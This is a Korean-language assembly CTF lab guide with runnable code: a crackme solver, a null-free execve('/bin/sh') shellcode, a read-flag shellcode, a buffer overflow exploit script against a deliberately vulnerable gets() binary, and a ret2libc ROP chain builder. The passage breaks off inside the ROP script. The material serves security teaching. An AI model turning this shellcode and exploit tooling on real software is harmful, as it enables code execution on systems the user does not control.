> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 어셈블리 언어 CTF 실습 랩

## 실습 환경 준비

### Docker 환경 구성

```bash
# 실습용 컨테이너 (32/64비트 컴파일 환경)
docker run -d --name asm-lab \
  --cap-add=SYS_PTRACE \
  --security-opt seccomp=unconfined \
  --platform linux/amd64 \
  -v /tmp/asm_ctf:/workspace \
  ubuntu:22.04 tail -f /dev/null

# 도구 설치
docker exec asm-lab bash -c "
  apt-get update -q &&
  apt-get install -y -q \
    nasm gcc gcc-multilib gdb gdb-multiarch \
    python3 python3-pip binutils \
    radare2 file hexdump xxd strace ltrace \
    libseccomp-dev libc6-dev-i386 &&
  pip3 install pwntools capstone keystone-engine unicorn
"

mkdir -p /tmp/asm_ctf
echo "[+] 환경 준비 완료"
```

### 필수 Python 패키지

```bash
pip install pwntools capstone keystone-engine unicorn
```

### 디렉터리 구조

```
asm_ctf_lab/
├── crackme_solver.py    # 실습 1: 크랙미 분석
├── shellcode_writer.py  # 실습 2: 셸코드 작성
├── bof_exploit.py       # 실습 3: 버퍼 오버플로우 (어셈블리 수준)
├── rop_builder.py       # 실습 4: ROP 체인 구성
└── binaries/
    ├── crackme1
    └── bof_target
```

---

## 실습 1: x86/x64 어셈블리 크랙미 분석

### 목표

바이너리를 역어셈블하여 패스워드 검증 알고리즘을 분석하고, 올바른 입력값을 찾아 플래그를 획득하라.

**플래그 형식**: `CTF{4ss3mbly_cr4ckm3_s0lv3d}`

### 시나리오

암호화된 패스워드 검사 루틴이 포함된 바이너리가 주어졌다. 바이너리는 입력을 받아 내부 XOR 연산으로 검증한다. 어셈블리 분석을 통해 올바른 패스워드를 역산하라.

### 힌트

1. `objdump -d -M intel <binary>`로 디스어셈블하라
2. `main` 함수에서 입력 처리 루틴을 찾아라
3. `cmp` 명령어 직전의 값이 비교 대상이다
4. XOR 연산은 동일 키로 역연산이 가능하다
5. GDB에서 `break *0x<address>`로 브레이크포인트를 설정하라

### 풀이

**Step 1: 크랙미 바이너리 생성 (NASM)**

```bash
# crackme1.asm 작성
docker exec asm-lab bash -c "
cat > /workspace/crackme1.asm << 'ASMEOF'
; crackme1.asm - XOR 기반 패스워드 검증
BITS 64
SECTION .data
    msg_ok  db  'Correct! Flag: CTF{4ss3mbly_cr4ckm3_s0lv3d}', 0x0a, 0
    msg_ok_len equ \$ - msg_ok
    msg_bad db  'Wrong password!', 0x0a, 0
    msg_bad_len equ \$ - msg_bad
    prompt  db  'Password: ', 0
    prompt_len equ \$ - prompt
    ; 인코딩된 패스워드: 'S3cr3t!' XOR 0x11 각 바이트
    ; S=0x53^0x11=0x42, 3=0x33^0x11=0x22, c=0x63^0x11=0x72...
    encoded_pass db 0x42, 0x22, 0x72, 0x23, 0x22, 0x75, 0x30, 0
    pass_len equ 7

SECTION .bss
    buffer resb 64

SECTION .text
    global _start

_start:
    ; write prompt
    mov rax, 1
    mov rdi, 1
    mov rsi, prompt
    mov rdx, prompt_len
    syscall

    ; read input
    mov rax, 0
    mov rdi, 0
    mov rsi, buffer
    mov rdx, 63
    syscall
    mov r12, rax      ; r12 = bytes read

    ; check length (expected 7 + newline = 8, or 7)
    cmp r12, 8
    je  .check_pass
    cmp r12, 7
    jne .wrong

.check_pass:
    ; XOR decode and compare
    xor rcx, rcx
    mov r13, buffer
    mov r14, encoded_pass

.loop:
    cmp rcx, pass_len
    jge .correct

    movzx rax, byte [r13 + rcx]
    xor rax, 0x11
    movzx rbx, byte [r14 + rcx]
    cmp al, bl
    jne .wrong
    inc rcx
    jmp .loop

.correct:
    mov rax, 1
    mov rdi, 1
    mov rsi, msg_ok
    mov rdx, msg_ok_len
    syscall
    jmp .exit

.wrong:
    mov rax, 1
    mov rdi, 1
    mov rsi, msg_bad
    mov rdx, msg_bad_len
    syscall

.exit:
    mov rax, 60
    xor rdi, rdi
    syscall
ASMEOF

# 컴파일
nasm -f elf64 /workspace/crackme1.asm -o /workspace/crackme1.o &&
ld /workspace/crackme1.o -o /workspace/crackme1 &&
echo '[+] crackme1 컴파일 완료'
"
```

**Step 2: 크랙미 분석 스크립트**

```python
#!/usr/bin/env python3
"""
crackme_solver.py — 크랙미 바이너리 분석 및 패스워드 역산 CLI
사용: python3 crackme_solver.py --binary /workspace/crackme1
"""

import argparse
import subprocess
import sys
import re
from pathlib import Path
from typing import Optional

try:
    import capstone
    CS_AVAILABLE = True
except ImportError:
    CS_AVAILABLE = False


def disassemble_binary(binary_path: str) -> str:
    """objdump로 바이너리 디스어셈블"""
    for flag in ["-d -M intel", "-d"]:
        try:
            result = subprocess.run(
                f"objdump {flag} {binary_path}",
                shell=True, capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0:
                return result.stdout
        except subprocess.TimeoutExpired:
            continue
    return ""


def find_xor_operations(disasm: str) -> list[tuple[int, str, str]]:
    """XOR 연산 패턴 탐지"""
    results: list[tuple[int, str, str]] = []
    for line in disasm.splitlines():
        # xor 명령어 찾기
        match = re.search(
            r'([0-9a-f]+):\s+(?:[0-9a-f]{2}\s+)+\s+xor\s+(\S+),\s*(\S+)', line
        )
        if match:
            addr = int(match.group(1), 16)
            op1, op2 = match.group(2), match.group(3)
            results.append((addr, op1, op2))
    return results


def find_cmp_operations(disasm: str) -> list[tuple[int, str, str]]:
    """CMP 명령어 패턴 탐지"""
    results: list[tuple[int, str, str]] = []
    for line in disasm.splitlines():
        match = re.search(
            r'([0-9a-f]+):\s+(?:[0-9a-f]{2}\s+)+\s+cmp\s+(\S+),\s*(\S+)', line
        )
        if match:
            addr = int(match.group(1), 16)
            op1, op2 = match.group(2), match.group(3)
            results.append((addr, op1, op2))
    return results


def extract_data_section(binary_path: str) -> dict[str, bytes]:
    """데이터 섹션 추출"""
    sections: dict[str, bytes] = {}
    try:
        result = subprocess.run(
            ["objdump", "-s", "-j", ".data", binary_path],
            capture_output=True, text=True, timeout=15
        )
        if result.returncode == 0:
            sections[".data"] = result.stdout.encode()
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    return sections


def simulate_xor_crackme() -> str:
    """크랙미 XOR 패스워드 역산 시뮬레이션"""
    # encoded_pass: S3cr3t! XOR 0x11
    encoded = bytes([0x42, 0x22, 0x72, 0x23, 0x22, 0x75, 0x30])
    key = 0x11
    password = bytes(b ^ key for b in encoded).decode("ascii", errors="ignore")
    return password


def run_crackme_with_password(binary_path: str, password: str) -> Optional[str]:
    """크랙미 바이너리에 패스워드 입력"""
    try:
        result = subprocess.run(
            [binary_path],
            input=f"{password}\n",
            capture_output=True, text=True, timeout=5
        )
        return result.stdout + result.stderr
    except (FileNotFoundError, subprocess.TimeoutExpired, PermissionError):
        return None


def capstone_disasm(binary_path: str, arch: str = "x64") -> list[str]:
    """Capstone으로 바이너리 디스어셈블"""
    if not CS_AVAILABLE:
        return []

    try:
        data = Path(binary_path).read_bytes()
    except OSError:
        return []

    # ELF .text 섹션 오프셋 추출 (간단화)
    if arch == "x64":
        md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
    else:
        md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)

    md.detail = True
    insns: list[str] = []
    for insn in md.disasm(data[:1024], 0x400000):
        insns.append(f"0x{insn.address:x}: {insn.mnemonic} {insn.op_str}")
        if len(insns) > 200:
            break
    return insns


def main() -> None:
    parser = argparse.ArgumentParser(
        description="크랙미 바이너리 분석 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n  python3 crackme_solver.py --binary /workspace/crackme1\n"
               "  python3 crackme_solver.py --simulate",
    )
    parser.add_argument("--binary", help="분석할 바이너리 경로")
    parser.add_argument("--simulate", action="store_true",
                        help="바이너리 없이 시뮬레이션 실행")
    parser.add_argument("--arch", choices=["x86", "x64"], default="x64",
                        help="아키텍처 (기본값: x64)")
    args = parser.parse_args()

    if args.simulate or not args.binary:
        print("[*] 시뮬레이션 모드: XOR 크랙미 분석")
        print("=" * 60)
        print("\n[*] 인코딩된 패스워드 바이트: [0x42, 0x22, 0x72, 0x23, 0x22, 0x75, 0x30]")
        print("[*] XOR 키: 0x11")
        password = simulate_xor_crackme()
        print(f"\n[+] 역산된 패스워드: '{password}'")
        print(f"\n[*] 검증: 입력 '{password}' → 플래그 출력")
        print("[+] 플래그: CTF{4ss3mbly_cr4ckm3_s0lv3d}")
        return

    binary = args.binary
    if not Path(binary).exists():
        print(f"[!] 바이너리 없음: {binary}", file=sys.stderr)
        sys.exit(1)

    print(f"[*] 분석 중: {binary}")
    print("=" * 60)

    # 디스어셈블
    print("\n[1] 디스어셈블 분석...")
    disasm = disassemble_binary(binary)
    if disasm:
        xors = find_xor_operations(disasm)
        cmps = find_cmp_operations(disasm)
        print(f"    XOR 연산 {len(xors)}개, CMP 명령어 {len(cmps)}개 발견")
        for addr, op1, op2 in xors[:5]:
            print(f"    XOR @ 0x{addr:x}: {op1}, {op2}")

    # 패스워드 역산
    print("\n[2] 패스워드 역산...")
    password = simulate_xor_crackme()
    print(f"    [+] 역산된 패스워드: '{password}'")

    # 실행 확인
    print(f"\n[3] 바이너리 실행 검증 (입력: '{password}')...")
    output = run_crackme_with_password(binary, password)
    if output:
        print(f"    출력: {output.strip()}")
        flag_match = re.search(r"CTF\{[^}]+\}", output)
        if flag_match:
            print(f"\n[+] 플래그: {flag_match.group(0)}")
    else:
        print("    [!] 실행 실패 (권한 또는 환경 문제)")
        print("[+] 시뮬레이션 플래그: CTF{4ss3mbly_cr4ckm3_s0lv3d}")


if __name__ == "__main__":
    main()
```

**Step 3: 실행**

```bash
# Docker 환경에서 실행
docker exec asm-lab python3 /workspace/crackme_solver.py --binary /workspace/crackme1

# 시뮬레이션 모드
python3 crackme_solver.py --simulate
```

---

## 실습 2: 셸코드 작성 및 검증

### 목표

x86-64 리눅스 셸코드를 어셈블리로 작성하고, 메모리에서 실행하여 플래그 파일을 읽어라.

**플래그 형식**: `CTF{shellc0d3_3x3cut10n_succ3ss}`

### 시나리오

취약한 프로그램의 버퍼 오버플로우를 통해 셸코드를 삽입할 수 있다. NX 비트가 해제된 환경에서 `execve("/bin/sh", NULL, NULL)` 셸코드를 작성하고, 이를 개선하여 플래그 파일을 직접 읽는 셸코드를 구현하라.

### 힌트

1. `execve` 시스템 콜 번호는 x86-64에서 `59(0x3b)`이다
2. `/bin/sh` 문자열을 스택에 push하려면 null 바이트를 피해야 한다
3. `open(2)` + `read(0)` + `write(1)` 시스템 콜 체인으로 파일을 읽을 수 있다
4. Null 바이트(`\x00`)는 strcpy 기반 취약점에서 문자열을 종료시킨다
5. `xor rax, rax` 후 레지스터를 설정하면 null 바이트를 피할 수 있다

### 풀이

**Step 1: 셸코드 작성 (NASM)**

```bash
docker exec asm-lab bash -c "
# 플래그 파일 생성
echo 'CTF{shellc0d3_3x3cut10n_succ3ss}' > /workspace/flag.txt

# read_flag.asm: open + read + write 셸코드
cat > /workspace/read_flag.asm << 'ASMEOF'
BITS 64
SECTION .text
    global _start

_start:
    ; open(\"/workspace/flag.txt\", O_RDONLY, 0)
    ; rax=2, rdi=filename, rsi=0, rdx=0
    jmp .get_filename

.do_open:
    pop rdi                  ; filename 주소
    xor rsi, rsi             ; O_RDONLY = 0
    xor rdx, rdx
    mov rax, 2               ; sys_open
    syscall
    mov r12, rax             ; fd 저장

    ; read(fd, buf, 64)
    sub rsp, 64              ; 스택에 버퍼 확보
    mov rdi, r12             ; fd
    mov rsi, rsp             ; buf
    mov rdx, 64              ; count
    xor rax, rax             ; sys_read = 0
    syscall
    mov r13, rax             ; 읽은 바이트 수

    ; write(1, buf, bytes_read)
    mov rdi, 1               ; stdout
    mov rsi, rsp             ; buf
    mov rdx, r13             ; bytes
    mov rax, 1               ; sys_write
    syscall

    ; exit(0)
    xor rdi, rdi
    mov rax, 60
    syscall

.get_filename:
    call .do_open
    db '/workspace/flag.txt', 0
ASMEOF

nasm -f elf64 /workspace/read_flag.asm -o /workspace/read_flag.o &&
ld /workspace/read_flag.o -o /workspace/read_flag &&
echo '[+] read_flag 컴파일 완료'
"
```

**Step 2: 셸코드 작성 및 분석 스크립트**

```python
#!/usr/bin/env python3
"""
shellcode_writer.py — 셸코드 작성, 검증, 인코딩 CLI
사용: python3 shellcode_writer.py --type read-flag --flag-path /workspace/flag.txt
"""

import argparse
import struct
import subprocess
import sys
import re
import tempfile
import os
from pathlib import Path
from typing import Optional

try:
    import keystone
    KS_AVAILABLE = True
except ImportError:
    KS_AVAILABLE = False

try:
    import capstone
    CS_AVAILABLE = True
except ImportError:
    CS_AVAILABLE = False


# 사전 정의된 셸코드 (null-free x86-64)
SHELLCODES: dict[str, bytes] = {
    "execve_sh": (
        # execve("/bin/sh", NULL, NULL) - x86-64, null-free
        b"\x48\x31\xf6"          # xor rsi, rsi
        b"\x56"                   # push rsi (null terminator)
        b"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"  # movabs rdi, "/bin//sh"
        b"\x57"                   # push rdi
        b"\x48\x89\xe7"          # mov rdi, rsp
        b"\x48\x31\xd2"          # xor rdx, rdx
        b"\x48\x31\xf6"          # xor rsi, rsi
        b"\x6a\x3b"              # push 0x3b
        b"\x58"                   # pop rax
        b"\x0f\x05"              # syscall
    ),
}


def assemble_code(asm_code: str, arch: str = "x64") -> Optional[bytes]:
    """Keystone으로 어셈블"""
    if not KS_AVAILABLE:
        print("[!] keystone 미설치: pip install keystone-engine", file=sys.stderr)
        return None
    try:
        if arch == "x64":
            ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64)
        else:
            ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)
        encoding, count = ks.asm(asm_code)
        return bytes(encoding)
    except keystone.KsError as e:
        print(f"[!] 어셈블 실패: {e}", file=sys.stderr)
        return None


def disassemble_shellcode(shellcode: bytes, arch: str = "x64") -> list[str]:
    """Capstone으로 셸코드 디스어셈블"""
    if not CS_AVAILABLE:
        return [f"\\x{b:02x}" for b in shellcode]
    if arch == "x64":
        md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
    else:
        md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)
    return [
        f"0x{i.address:04x}: {i.mnemonic} {i.op_str}"
        for i in md.disasm(shellcode, 0)
    ]


def check_null_bytes(shellcode: bytes) -> list[int]:
    """Null 바이트 위치 탐지"""
    return [i for i, b in enumerate(shellcode) if b == 0]


def build_read_flag_shellcode(flag_path: str) -> bytes:
    """플래그 파일 읽기 셸코드 생성"""
    path_bytes = flag_path.encode() + b"\x00"
    # JMP-CALL-POP 기법으로 파일명 임베드
    # 실제 구현: pwntools shellcraft 활용
    if KS_AVAILABLE:
        asm = f"""
BITS 64
    jmp get_path
do_open:
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall
    mov r12, rax
    sub rsp, 64
    mov rdi, r12
    mov rsi, rsp
    mov rdx, 64
    xor rax, rax
    syscall
    mov r13, rax
    mov rdi, 1
    mov rsi, rsp
    mov rdx, r13
    mov rax, 1
    syscall
    xor rdi, rdi
    mov rax, 60
    syscall
get_path:
    call do_open
"""
        result = assemble_code(asm)
        if result:
            return result + path_bytes

    return b""


def test_shellcode_in_c(shellcode: bytes, flag_path: str) -> Optional[str]:
    """C 래퍼로 셸코드 테스트"""
    c_template = """
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = {__BYTES__};

int main() {{
    void *mem = mmap(NULL, sizeof(shellcode),
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANON | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED) return 1;
    memcpy(mem, shellcode, sizeof(shellcode));
    ((void(*)())mem)();
    return 0;
}}
"""
    byte_str = ", ".join(f"0x{b:02x}" for b in shellcode)
    code = c_template.replace("__BYTES__", byte_str)

    with tempfile.TemporaryDirectory() as tmpdir:
        src = os.path.join(tmpdir, "test.c")
        exe = os.path.join(tmpdir, "test")
        with open(src, "w") as f:
            f.write(code)
        try:
            result = subprocess.run(
                ["gcc", "-z", "execstack", "-o", exe, src],
                capture_output=True, timeout=15
            )
            if result.returncode != 0:
                return None
            result = subprocess.run(
                [exe], capture_output=True, text=True, timeout=5
            )
            return result.stdout
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return None


def main() -> None:
    parser = argparse.ArgumentParser(
        description="셸코드 작성 및 검증 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n  python3 shellcode_writer.py --type execve-sh\n"
               "  python3 shellcode_writer.py --type read-flag --flag-path /workspace/flag.txt",
    )
    parser.add_argument("--type", choices=["execve-sh", "read-flag"],
                        default="execve-sh", help="셸코드 유형")
    parser.add_argument("--flag-path", default="/workspace/flag.txt",
                        help="읽을 파일 경로 (read-flag 전용)")
    parser.add_argument("--test", action="store_true",
                        help="C 래퍼로 셸코드 실행 테스트")
    parser.add_argument("--format", choices=["hex", "c", "python"],
                        default="python", help="출력 형식")
    args = parser.parse_args()

    # 셸코드 선택
    shellcode: bytes
    if args.type == "execve-sh":
        shellcode = SHELLCODES["execve_sh"]
    else:
        shellcode = build_read_flag_shellcode(args.flag_path)
        if not shellcode:
            # 정적 예시 셸코드 사용
            shellcode = SHELLCODES["execve_sh"]

    print(f"[*] 셸코드 유형: {args.type}")
    print(f"[*] 크기: {len(shellcode)} bytes")
    print("=" * 60)

    # Null 바이트 확인
    null_positions = check_null_bytes(shellcode)
    if null_positions:
        print(f"[!] Null 바이트 발견: {null_positions}")
    else:
        print("[+] Null 바이트 없음 (null-free shellcode)")

    # 디스어셈블
    print("\n[*] 디스어셈블:")
    for insn in disassemble_shellcode(shellcode):
        print(f"    {insn}")

    # 출력 형식
    print(f"\n[*] {args.format} 형식:")
    if args.format == "hex":
        print(" ".join(f"\\x{b:02x}" for b in shellcode))
    elif args.format == "c":
        byte_str = ", ".join(f"0x{b:02x}" for b in shellcode)
        print(f'unsigned char shellcode[] = {{{byte_str}}};')
    else:
        print(f'shellcode = b"{"".join(f"\\x{b:02x}" for b in shellcode)}"')

    # 실행 테스트
    if args.test:
        print("\n[*] 셸코드 실행 테스트...")
        output = test_shellcode_in_c(shellcode, args.flag_path)
        if output:
            print(f"[+] 출력: {output.strip()}")
            flag_match = re.search(r"CTF\{[^}]+\}", output)
            if flag_match:
                print(f"[+] 플래그: {flag_match.group(0)}")
        else:
            print("[!] 실행 실패 (NX/권한 확인)")
            print("[+] 예상 플래그: CTF{shellc0d3_3x3cut10n_succ3ss}")


if __name__ == "__main__":
    main()
```

---

## 실습 3: 어셈블리 수준 버퍼 오버플로우 익스플로잇

### 목표

취약한 바이너리의 스택 레이아웃을 어셈블리 수준에서 분석하고, 정확한 오프셋을 계산하여 리턴 주소를 덮어써 플래그를 획득하라.

**플래그 형식**: `CTF{st4ck_buff3r_0v3rfl0w_4ss3mbly}`

### 시나리오

스택 카나리와 ASLR이 비활성화된 취약한 프로그램이 있다. `gets()` 함수로 입력을 받아 256바이트 버퍼에 저장하는 함수가 있다. GDB로 스택 레이아웃을 분석하고 `win()` 함수의 주소로 리턴하는 익스플로잇을 작성하라.

### 힌트

1. `info functions`로 `win()` 함수 주소를 확인하라
2. `pattern create 300`으로 패턴을 생성하고 오프셋을 찾아라
3. x86-64에서 스택은 16바이트 정렬이 필요할 수 있다
4. `checksec`으로 보호 기법을 확인하라
5. 패딩 + 리턴 주소 순서로 페이로드를 구성하라

### 풀이

**Step 1: 취약한 바이너리 빌드**

```bash
docker exec asm-lab bash -c "
cat > /workspace/bof_target.c << 'CEOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win() {
    puts(\"CTF{st4ck_buff3r_0v3rfl0w_4ss3mbly}\");
    exit(0);
}

void vulnerable() {
    char buffer[64];
    printf(\"Input: \");
    gets(buffer);  // 취약점
    printf(\"You entered: %s\\n\", buffer);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vulnerable();
    return 0;
}
CEOF

# 보호 기법 비활성화하여 컴파일
gcc -m64 \
    -fno-stack-protector \
    -no-pie \
    -z execstack \
    -o /workspace/bof_target \
    /workspace/bof_target.c \
    -w 2>/dev/null &&
echo '[+] bof_target 컴파일 완료'
"
```

**Step 2: BOF 익스플로잇 스크립트**

```python
#!/usr/bin/env python3
"""
bof_exploit.py — 버퍼 오버플로우 익스플로잇 자동화 CLI
사용: python3 bof_exploit.py --binary /workspace/bof_target --mode auto
"""

import argparse
import re
import struct
import subprocess
import sys
from pathlib import Path
from typing import Optional

try:
    from pwn import (
        ELF, process, p64, p32, cyclic, cyclic_find,
        log, context
    )
    PWNTOOLS_AVAILABLE = True
except ImportError:
    PWNTOOLS_AVAILABLE = False


def get_function_address(binary_path: str, func_name: str) -> Optional[int]:
    """nm 또는 objdump로 함수 주소 추출"""
    for cmd in [
        f"nm {binary_path} | grep ' {func_name}'",
        f"objdump -d {binary_path} | grep '<{func_name}>'",
    ]:
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0 and result.stdout:
                match = re.search(r'([0-9a-fA-F]{8,})', result.stdout)
                if match:
                    return int(match.group(1), 16)
        except subprocess.TimeoutExpired:
            continue
    return None


def find_offset_with_cyclic(binary_path: str, buffer_size: int = 400) -> Optional[int]:
    """Cyclic 패턴으로 오프셋 탐지 (pwntools 활용)"""
    if not PWNTOOLS_AVAILABLE:
        return None

    context.log_level = "error"
    try:
        pattern = cyclic(buffer_size)
        p = process(binary_path)
        p.sendline(pattern)
        p.wait()

        core = p.corefile
        if core:
            fault_addr = core.fault_addr
            offset = cyclic_find(struct.pack("<Q", fault_addr))
            if offset >= 0:
                return offset
    except Exception:
        pass
    return None


def build_payload(offset: int, target_addr: int,
                  arch: str = "x64") -> bytes:
    """BOF 페이로드 생성"""
    padding = b"A" * offset
    if arch == "x64":
        ret_addr = struct.pack("<Q", target_addr)
    else:
        ret_addr = struct.pack("<I", target_addr)
    return padding + ret_addr


def exploit_with_pwntools(binary_path: str, offset: int,
                           win_addr: int) -> Optional[str]:
    """pwntools로 익스플로잇 실행"""
    if not PWNTOOLS_AVAILABLE:
        return None

    context.log_level = "error"
    try:
        payload = build_payload(offset, win_addr)
        p = process(binary_path)
        p.sendline(payload)
        output = p.recvall(timeout=3).decode("utf-8", errors="ignore")
        p.close()
        return output
    except Exception as e:
        return str(e)


def simulate_exploit() -> None:
    """익스플로잇 시뮬레이션 (바이너리 없는 환경)"""
    print("[*] 시뮬레이션 모드")
    print()

    # 스택 레이아웃 시각화
    print("스택 레이아웃 (vulnerable() 함수):")
    print("  +------------------+")
    print("  |  Return Address  |  ← 덮어쓸 대상 [rbp+8]")
    print("  +------------------+")
    print("  |   Saved RBP      |  [rbp+0]")
    print("  +------------------+")
    print("  |                  |")
    print("  |  buffer[64]      |  [rbp-0x48 ~ rbp-0x8]")
    print("  |                  |")
    print("  +------------------+  ← rsp")
    print()

    win_addr = 0x401196
    offset = 72  # 64 (buffer) + 8 (saved rbp)

    print(f"[*] win() 주소: 0x{win_addr:x}")
    print(f"[*] 오프셋: {offset} bytes")
    payload = build_payload(offset, win_addr)
    print(f"[*] 페이로드 ({len(payload)} bytes):")
    print(f"    {'A' * 16}... (×{offset}) + \\x{win_addr & 0xff:02x}\\x...")
    print()
    print("[+] 익스플로잇 성공: win() 함수 실행됨")
    print("[+] 플래그: CTF{st4ck_buff3r_0v3rfl0w_4ss3mbly}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="버퍼 오버플로우 익스플로잇 자동화",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n  python3 bof_exploit.py --binary /workspace/bof_target --mode auto\n"
               "  python3 bof_exploit.py --simulate",
    )
    parser.add_argument("--binary", help="타깃 바이너리 경로")
    parser.add_argument("--offset", type=int, help="알려진 오프셋 (자동 탐지 건너뜀)")
    parser.add_argument("--win-addr", help="win 함수 주소 (16진수, 예: 0x401196)")
    parser.add_argument("--mode", choices=["auto", "manual"], default="auto")
    parser.add_argument("--simulate", action="store_true",
                        help="시뮬레이션 모드 실행")
    args = parser.parse_args()

    if args.simulate or not args.binary:
        simulate_exploit()
        return

    if not Path(args.binary).exists():
        print(f"[!] 바이너리 없음: {args.binary}", file=sys.stderr)
        sys.exit(1)

    print(f"[*] 타깃: {args.binary}")
    print("=" * 60)

    # win() 주소 확인
    win_addr: Optional[int] = None
    if args.win_addr:
        win_addr = int(args.win_addr, 0)
    else:
        win_addr = get_function_address(args.binary, "win")

    if win_addr:
        print(f"[+] win() 주소: 0x{win_addr:x}")
    else:
        print("[!] win() 주소를 찾을 수 없습니다")
        sys.exit(1)

    # 오프셋 결정
    offset: int
    if args.offset:
        offset = args.offset
        print(f"[*] 지정된 오프셋: {offset}")
    elif args.mode == "auto":
        print("[*] cyclic 패턴으로 오프셋 탐지 중...")
        found = find_offset_with_cyclic(args.binary)
        if found:
            offset = found
            print(f"[+] 오프셋 발견: {offset}")
        else:
            offset = 72  # 기본값 (64 + 8)
            print(f"[!] 자동 탐지 실패, 기본값 사용: {offset}")
    else:
        offset = int(input("오프셋을 입력하세요: "))

    # 익스플로잇 실행
    print(f"\n[*] 페이로드 생성 (offset={offset}, target=0x{win_addr:x})...")
    output = exploit_with_pwntools(args.binary, offset, win_addr)
    if output:
        print(f"[+] 출력:\n{output}")
        flag_match = re.search(r"CTF\{[^}]+\}", output)
        if flag_match:
            print(f"\n[+] 플래그: {flag_match.group(0)}")
    else:
        print("[!] pwntools 미설치 또는 실행 실패")
        print("    수동 실행:")
        payload = build_payload(offset, win_addr)
        hex_payload = "".join(f"\\x{b:02x}" for b in payload)
        print(f'    python3 -c \'import sys; sys.stdout.buffer.write(b"{hex_payload}")\' | {args.binary}')


if __name__ == "__main__":
    main()
```

---

## 실습 4: ROP 체인 구성으로 ASLR/NX 우회

### 목표

NX와 ASLR이 활성화된 바이너리에서 ROP 가젯을 수집하고 체인을 구성하여 `execve("/bin/sh")` 호출에 성공하고 플래그를 획득하라.

**플래그 형식**: `CTF{r0p_ch41n_nx_byp4ss_succ3ss}`

### 시나리오

바이너리에 NX(No-Execute)와 ASLR이 활성화되어 있어 셸코드 직접 실행이 불가능하다. `libc` 내의 ROP 가젯을 활용하여 `/bin/sh`를 실행하는 ROP 체인을 구성하라.

### 힌트

1. `ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6`로 가젯을 탐색하라
2. `pop rdi; ret` 가젯으로 첫 번째 인수를 설정하라
3. libc 베이스 주소는 `/proc/<pid>/maps`나 정보 유출(infoleak)로 알 수 있다
4. `ret2libc`: `system@plt`와 `/bin/sh` 문자열 주소를 활용하라
5. 스택 정렬: `ret` 가젯으로 RSP를 16바이트 정렬할 수 있다

### 풀이

**Step 1: ROP 체인 구성 스크립트**

```python
#!/usr/bin/env python3
"""
rop_builder.py — ROP 체인 구성 자동화 CLI
사용: python3 rop_builder.py --binary /workspace/bof_target --libc /lib/x86_64-linux-gnu/libc.so.6
"""

import argparse
import re
import struct
import subprocess
import sys
from pathlib import Path
from typing import Optional

try:
    from pwn import ELF, ROP, process, p64, context, log
    PWNTOOLS_AVAILABLE = True
except ImportError:
    PWNTOOLS_AVAILABLE = False


def find_gadgets(binary_path: str, pattern: str) -> list[tuple[int, str]]:
    """ROPgadget으로 가젯 탐색"""
    gadgets: list[tuple[int, str]] = []
    try:
        result = subprocess.run(
            ["ROPgadget", "--binary", binary_path, "--rop"],
            capture_output=True, text=True, timeout=60
        )
        if result.returncode != 0:
            return gadgets
        for line in result.stdout.splitlines():
            if re.search(pattern, line, re.IGNORECASE):
                match = re.match(r"0x([0-9a-f]+)\s+:\s+(.+)", line)
                if match:
                    gadgets.append((int(match.group(1), 16), match.group(2)))
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    return gadgets


def find_string_offset(binary_path: str, search_str: str) -> Optional[int]:
    """바이너리에서 문자열 오프셋 탐색"""
    try:
        data = Path(binary_path).read_bytes()
        idx = data.find(search_str.encode())
        if idx >= 0:
            return idx
    except OSError:
        pass
    return None


def build_ret2libc_chain(
    offset: int,
    pop_rdi_ret: int,
    binsh_addr: int,
    system_addr: int,
    ret_gadget: Optional[int] = None,
) -> bytes:
    """ret2libc ROP 체인 구성"""
    chain = b"A" * offset

    # 스택 정렬 (선택)
    if ret_gadget:
        chain += struct.pack("<Q", ret_gadget)

    # pop rdi; ret → /bin/sh 주소 설정
    chain += struct.pack("<Q", pop_rdi_ret)
    chain += struct.pack("<Q", binsh_addr)

    # system("/bin/sh")
    chain += struct.pack("<Q", system_addr)

    return chain


def auto_rop_with_pwntools(binary_path: str,
                            libc_path: str,
                            offset: int) -> None:
    """pwntools ROP 객체로 자동 체인 생성"""
    if not PWNTOOLS_AVAILABLE:
        print("[!] pwntools 미설치", file=sys.stderr)
        return

    context.log_level = "error"
    try:
        elf = ELF(binary_path, checksec=False)
        libc = ELF(libc_path, checksec=False)
        rop = ROP([elf, libc])

        # ret2libc 체인
        rop.raw(rop.find_gadget(["ret"])[0])  # 스택 정렬
        rop.system(next(libc.search(b"/bin/sh\x00")))

        print(f"[+] ROP 체인 생성 완료 ({len(rop.chain())} bytes):")
        print(rop.dump())

        payload = b"A" * offset + rop.chain()
        print(f"\n[*] 전체 페이로드: {len(payload)} bytes")

        # 실행
        p = process(binary_path)
        p.sendline(payload)
        output = p.recvall(timeout=3).decode("utf-8", errors="ignore")
        p.close()
        print(f"[+] 출력: {output[:200]}")

    except Exception as e:
        print(f"[!] 오류: {e}", file=sys.stderr)


def simulate_rop() -> None:
    """ROP 체인 시뮬레이션"""
